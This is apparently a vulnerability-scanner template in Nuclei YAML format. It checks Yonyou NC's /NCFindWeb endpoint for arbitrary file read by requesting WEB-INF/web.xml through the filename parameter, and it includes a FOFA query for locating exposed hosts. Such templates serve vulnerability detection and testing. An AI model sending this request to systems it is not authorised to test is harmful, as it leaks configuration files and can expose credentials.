id: yonyou-ncfindweb-fileread

info:
  name: 用友 NC NCFindWeb 任意文件读取
  author: princechaddha
  severity: high
  description: |
    用友 NC /NCFindWeb 可通过 filename 读取 WEB-INF/web.xml（<web-app>）。与已有目录列举模板 erp-nc-directory-traversal 不同，本条校验文件内容。属 NC leftover。
  reference:
    - https://github.com/zan8in/afrog
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
  metadata:
    verified: true
    max-request: 1
    fofa-query: icon_hash="1085941792"
  tags: yonyou,nc,fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<web-app"
          - "</web-app>"
        condition: and
      - type: status
        status:
          - 200
